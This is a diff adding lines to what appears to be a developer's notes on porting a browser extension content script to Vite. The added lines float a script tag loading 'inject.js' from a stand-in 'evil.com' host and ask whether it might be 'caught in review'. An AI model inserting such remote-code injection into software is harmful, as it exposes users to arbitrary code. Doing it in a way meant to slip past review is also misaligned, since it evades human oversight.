@@ -23,3 +23,9 @@ does content-vite need to speak to boackgroun.js???
 
 next task
   port content to content-vite
+
+
+
+is <script src=http://some.evil.com/inject.js type=module /> possible?
+well it works for localhost...
+maybe caught in review???
